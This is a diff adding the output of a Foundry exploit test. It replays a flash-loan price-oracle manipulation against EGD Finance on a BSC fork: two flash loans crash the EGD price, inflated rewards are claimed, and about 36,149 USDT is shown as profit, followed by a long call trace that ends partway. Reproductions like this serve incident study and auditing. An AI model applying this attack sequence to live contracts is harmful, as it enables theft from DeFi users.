@@ -1,0 +1,500 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/EGD_Finance_exp.sol:Attacker
+[PASS] testExploit() (gas: 5538441)
+Logs:
+  --------------------  Pre-work, stake 100 USDT to EGD Finance --------------------
+  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
+  Attacker Stake 100 USDT to EGD Finance
+  -------------------------------- Start Exploit ----------------------------------
+  [Start] Attacker USDT Balance: 0.000000000000000000
+  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
+  [INFO] Current earned reward (EGD token): 0.000341874999999972
+  Attacker manipulating price oracle of EGD Finance...
+  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
+  Flashloan[1] received
+  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
+  Flashloan[2] received
+  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
+  Claim all EGD Token reward from EGD Finance contract
+  [INFO] Get reward (EGD token): 5630136.300267721935770000
+  Flashloan[2] payback success
+  Swap the profit...
+  Flashloan[1] payback success
+  -------------------------------- End Exploit ----------------------------------
+  [End] Attacker USDT Balance: 36149.420145779809942475
+
+Traces:
+  [7955] Attacker::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 20245522 [2.024e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(USDT_WBNB_LPPool: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], "USDT_WBNB_LPPool")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], "EGD_USDT_LPPool")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "pancakeRouter")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], "EGD_Finance")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDT: [0x55d398326f99059fF775485246999027B3197955], "USDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(EGD: [0x202b233735bF743FA31abb8f71e641970161bF98], "EGD")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [5711641] Attacker::testExploit()
+    ├─ [4303034] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 12: 0 → 1
+    │   │   @ 31: 0 → 1
+    │   └─ ← [Return] 21269 bytes of code
+    ├─ [0] console::log("--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attacker Stake 100 USDT to EGD Finance") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [892312] Exploit::stake()
+    │   ├─ [2531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [0] VM::record()
+    │   │   └─ ← [Return]
+    │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [0] VM::accesses(USDT: [0x55d398326f99059fF775485246999027B3197955])
+    │   │   └─ ← [Return] [0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a], []
+    │   ├─ [0] VM::load(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ emit WARNING_UninitedSlot(who: USDT: [0x55d398326f99059fF775485246999027B3197955], slot: 101865277652109193157934748849462594086263052630085157397691791389601577573226 [1.018e77])
+    │   ├─ [0] VM::load(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [0] VM::store(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   │   └─ ← [Return]
+    │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   ├─ [0] VM::store(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   │   └─ ← [Return]
+    │   ├─ emit SlotFound(who: USDT: [0x55d398326f99059fF775485246999027B3197955], fsig: 0x70a08231, keysHash: 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11, slot: 101865277652109193157934748849462594086263052630085157397691791389601577573226 [1.018e77])
+    │   ├─ [0] VM::load(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ [0] VM::store(USDT: [0x55d398326f99059fF775485246999027B3197955], 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a, 0x0000000000000000000000000000000000000000000000056bc75e2d63100000)
+    │   │   └─ ← [Return]
+    │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   ├─ [37528] EGD_Finance::bond(0x659b136c49Da3D9ac48682D02F7BD8806184e218)
+    │   │   ├─ [30200] 0x93c175439726797DcEe24D08e4ac9164E88e7Aee::bond(0x659b136c49Da3D9ac48682D02F7BD8806184e218) [delegatecall]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0984a69ac10677aab39e04b44cf0942cce817736193660a54d33ea47d690f5de: 0 → 0x000000000000000000000000659b136c49da3d9ac48682d02f7bd8806184e218
+    │   │   │   │   @ 0x868ab8bc4d3b9289181efdd93e8062603348d099d9eeaf4b150da8ba03c6ee28: 3 → 4
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─ [24562] USDT::approve(EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], 100000000000000000000 [1e20])
+    │   │   ├─ emit Approval(owner: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], value: 100000000000000000000 [1e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0afedcebd0377c087bbb9251a09d5a17ec296cfa5523b26bdde094c3ca6869ab: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   └─ ← [Return] true
+    │   ├─ [556509] EGD_Finance::stake(100000000000000000000 [1e20])
+    │   │   ├─ [555681] 0x93c175439726797DcEe24D08e4ac9164E88e7Aee::stake(100000000000000000000 [1e20]) [delegatecall]
+    │   │   │   ├─ [10834] USDT::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], 100000000000000000000 [1e20])
+    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], value: 100000000000000000000 [1e20])
+    │   │   │   │   ├─ emit Approval(owner: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], value: 0)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
+    │   │   │   │   │   @ 0x0afedcebd0377c087bbb9251a09d5a17ec296cfa5523b26bdde094c3ca6869ab: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
+    │   │   │   │   │   @ 0x0e7cbdfd1ddda18f8174e43a79917b6c3d527f67891da7c6ff931c78ac9e0ff1: 3 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100003
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [24562] USDT::approve(pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 70000000000000000000 [7e19])
+    │   │   │   │   ├─ emit Approval(owner: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], spender: pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 70000000000000000000 [7e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x9d35c811fa005921a15f2b5b9b2317f127233114aa9943f262ccccb5e81044ae: 0 → 0x000000000000000000000000000000000000000000000003cb71f51fc5580000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [145620] pancakeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(70000000000000000000 [7e19], 0, [0x55d398326f99059fF775485246999027B3197955, 0x202b233735bF743FA31abb8f71e641970161bF98], EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], 1660634092 [1.66e9])
+    │   │   │   │   ├─ [10834] USDT::transferFrom(EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], 70000000000000000000 [7e19])
+    │   │   │   │   │   ├─ emit Transfer(from: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], to: EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], value: 70000000000000000000 [7e19])
+    │   │   │   │   │   ├─ emit Approval(owner: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], spender: pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0e7cbdfd1ddda18f8174e43a79917b6c3d527f67891da7c6ff931c78ac9e0ff1: 0x0000000000000000000000000000000000000000000000056bc75e2d63100003 → 0x000000000000000000000000000000000000000000000001a055690d9db80003
+    │   │   │   │   │   │   @ 0x9d35c811fa005921a15f2b5b9b2317f127233114aa9943f262ccccb5e81044ae: 0x000000000000000000000000000000000000000000000003cb71f51fc5580000 → 0
+    │   │   │   │   │   │   @ 0xe46ab351cfc7e645f5025e69527f16427d41b1d8f9405046d3951160b206b0db: 0x0000000000000000000000000000000000000000000059e1d16a7de33260fd29 → 0x0000000000000000000000000000000000000000000059e59cdc7302f7b8fd29
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [4844] EGD::balanceOf(EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5670246682724687331970000 [5.67e24]
+    │   │   │   │   ├─ [2893] EGD_USDT_LPPool::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 52443151506653906536540000 [5.244e25], 424456224403899287665961 [4.244e23], 1659914092 [1.659e9]
+    │   │   │   │   ├─ [531] USDT::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 424526224403899287665961 [4.245e23]
+    │   │   │   │   ├─ [113482] EGD_USDT_LPPool::swap(8625720516076474383471 [8.625e21], 0, EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], 0x)
+    │   │   │   │   │   ├─ [89282] EGD::transfer(EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], 8625720516076474383471 [8.625e21])
+    │   │   │   │   │   │   ├─ [12562] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [4796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [6062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [4796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   ├─ emit Transfer(from: EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], to: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], value: 8625720516076474383471 [8.625e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x973b5bfd2299bffa7fb792ae88fcbb7c23869bf8efdaebe925e184fd5f48d37b: 0x000000000000000000000000000000000000000000000466863e66481bb46bf0 → 0x0000000000000000000000000000000000000000000004669236defe14f560be
+    │   │   │   │   │   │   │   @ 0x5096d594c17fa3ff55677e295e2b3bf55957472d4bf73daad1f9d5c7f48341f4: 0x00000000000000000000000000000000000000000000446ae52be4036cfa3034 → 0x00000000000000000000000000000000000000000000446b5ce09b1f2983c040
+    │   │   │   │   │   │   │   @ 0x605dad40018b1c400089e80bd7f208a7179aafeb9655950d98a4a7ab105c32ce: 0x00000000000000000000000000000000000000000000001ebd0c4b918034ad0d → 0x00000000000000000000000000000000000000000000001ec904c4477975a1db
+    │   │   │   │   │   │   │   @ 0xc37a8afa0267775364d579f946ac39132758a218ad1236fe55c39881c6ec100c: 0x00000000000000000000000000000000000000000000011c4b7e2bf529c680d6 → 0x00000000000000000000000000000000000000000000011c3f85b33f30858c08
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [844] EGD::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 52434525786137830062160000 [5.243e25]
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 424526224403899287665961 [4.245e23]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 52434525786137830062160000 [5.243e25], reserve1: 424526224403899287665961 [4.245e23])
+    │   │   │   │   │   ├─ emit Swap(sender: pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 3471, amount1In: 70000000000000000000 [7e19], amount0Out: 8625720516076474383471 [8.625e21], amount1Out: 0, to: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x62f0476c0000000059e1d16a7de33260fd290000002b6144f09518afda08a760 → 0x62f0476c0000000059e59cdc7302f7b8fd290000002b5f7156a9d45760adf880
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [844] EGD::balanceOf(EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5678872403240763806350000 [5.678e24]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [8071] USDT::transfer(0xC8D45fF624F698FA4E745F02518f451ec4549AE8, 10000000000000000000 [1e19])
+    │   │   │   │   ├─ emit Transfer(from: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], to: 0xC8D45fF624F698FA4E745F02518f451ec4549AE8, value: 10000000000000000000 [1e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0e7cbdfd1ddda18f8174e43a79917b6c3d527f67891da7c6ff931c78ac9e0ff1: 0x000000000000000000000000000000000000000000000001a055690d9db80003 → 0x000000000000000000000000000000000000000000000001158e460913d00003
+    │   │   │   │   │   @ 0xd72ebd080cb3899d54ebcd116439b6f2bb5ae95ed885340a962ade103dfcf0bc: 0x000000000000000000000000000000000000000000000145bfd4e62310e142a7 → 0x0000000000000000000000000000000000000000000001464a9c09279ac942a7
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [8071] USDT::transfer(0x659b136c49Da3D9ac48682D02F7BD8806184e218, 6000000000000000000 [6e18])
+    │   │   │   │   ├─ emit Transfer(from: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], to: 0x659b136c49Da3D9ac48682D02F7BD8806184e218, value: 6000000000000000000 [6e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2701adc2f195fd7ed2cb09e428404b472cbc99d3b6309fd5d1f41e3d8524d639: 0x000000000000000000000000000000000000000000000000f9ccd8a1c5080000 → 0x0000000000000000000000000000000000000000000000014d1120d7b1600000
+    │   │   │   │   │   @ 0x0e7cbdfd1ddda18f8174e43a79917b6c3d527f67891da7c6ff931c78ac9e0ff1: 0x000000000000000000000000000000000000000000000001158e460913d00003 → 0x000000000000000000000000000000000000000000000000c249fdd327780003
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [8071] USDT::transfer(0x527E02E9526f9C278a4de6CB619aa60B80EC5B77, 3000000000000000000 [3e18])
+    │   │   │   │   ├─ emit Transfer(from: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], to: 0x527E02E9526f9C278a4de6CB619aa60B80EC5B77, value: 3000000000000000000 [3e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0e7cbdfd1ddda18f8174e43a79917b6c3d527f67891da7c6ff931c78ac9e0ff1: 0x000000000000000000000000000000000000000000000000c249fdd327780003 → 0x00000000000000000000000000000000000000000000000098a7d9b8314c0003
+    │   │   │   │   │   @ 0x1da9ff26f1b939cbe8e6a4854cb9e3d5d5e04852d3076b5da843ee4b2ae1d761: 0x00000000000000000000000000000000000000000000000176b344f2a78c0000 → 0x000000000000000000000000000000000000000000000001a055690d9db80000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [8071] USDT::transfer(0xfE6E0D65f67a28bE4eC5cF0EfDBCb44a40BeAcc0, 2000000000000000000 [2e18])
+    │   │   │   │   ├─ emit Transfer(from: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], to: 0xfE6E0D65f67a28bE4eC5cF0EfDBCb44a40BeAcc0, value: 2000000000000000000 [2e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x8d927938215fe301ec4fe939d69f3348068c8401a50f9003bbf191fd522c374e: 0x000000000000000000000000000000000000000000000000764cdf25d31e33bf → 0x000000000000000000000000000000000000000000000000920e4c8d21e633bf
+    │   │   │   │   │   @ 0x0e7cbdfd1ddda18f8174e43a79917b6c3d527f67891da7c6ff931c78ac9e0ff1: 0x00000000000000000000000000000000000000000000000098a7d9b8314c0003 → 0x0000000000000000000000000000000000000000000000007ce66c50e2840003
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [8071] USDT::transfer(0xA2805843de2b51daDdf6CB49E835ab9266143B26, 3000000000000000000 [3e18])
+    │   │   │   │   ├─ emit Transfer(from: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], to: 0xA2805843de2b51daDdf6CB49E835ab9266143B26, value: 3000000000000000000 [3e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0e7cbdfd1ddda18f8174e43a79917b6c3d527f67891da7c6ff931c78ac9e0ff1: 0x0000000000000000000000000000000000000000000000007ce66c50e2840003 → 0x00000000000000000000000000000000000000000000000053444835ec580003
+    │   │   │   │   │   @ 0x4dda7734cdf03d923b008219ef92a01927f3425f37cc6cfe46c11475d0b2eed9: 0x000000000000000000000000000000000000000000000000baa71077fb9dc02c → 0x000000000000000000000000000000000000000000000000e4493492f1c9c02c
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [3271] USDT::transfer(0xC8D45fF624F698FA4E745F02518f451ec4549AE8, 6000000000000000000 [6e18])
+    │   │   │   │   ├─ emit Transfer(from: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], to: 0xC8D45fF624F698FA4E745F02518f451ec4549AE8, value: 6000000000000000000 [6e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0e7cbdfd1ddda18f8174e43a79917b6c3d527f67891da7c6ff931c78ac9e0ff1: 0x00000000000000000000000000000000000000000000000053444835ec580003 → 3
+    │   │   │   │   │   @ 0xd72ebd080cb3899d54ebcd116439b6f2bb5ae95ed885340a962ade103dfcf0bc: 0x0000000000000000000000000000000000000000000001464a9c09279ac942a7 → 0x0000000000000000000000000000000000000000000001469de0515d872142a7
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit Stake(account: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 100000000000000000000 [1e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xfec3f76c1517d62a9fce4e78417ae2ea979ec4045e09189f813552c496a56b64: 0x000000000000000000000000000000000000000000000001236efcbcbb340000 → 0x0000000000000000000000000000000000000000000000014d1120d7b1600000
+    │   │   │   │   @ 0x868ab8bc4d3b9289181efdd93e8062603348d099d9eeaf4b150da8ba03c6ee29: 0x000000000000000000000000000000000000000000000000f9ccd8a1c5080000 → 0x0000000000000000000000000000000000000000000000014d1120d7b1600000
+    │   │   │   │   @ 0x0984a69ac10677aab39e04b44cf0942cce817736193660a54d33ea47d690f5dd: 0 → 1
+    │   │   │   │   @ 0xd3264e144787b1d045ac2ba025683f676e3ab79303527c366f2c3e7b9b01fba8: 0x0000000000000000000000000000000000000000000000090d972f32323c0000 → 0x0000000000000000000000000000000000000000000000093739534d28680000
+    │   │   │   │   @ 0xfdd5ae61e639b4934e5d24ac28c14483eeba1a3a20a6798b1243881d26e9dae4: 0 → 177
+    │   │   │   │   @ 0x9a27de523662cbef519263bd1020efb3d13dfb812ffd2417ebbff3e7e4c05e16: 0x0000000000000000000000000000000000000000000000006f05b59d3b200000 → 0x0000000000000000000000000000000000000000000000008ac7230489e80000
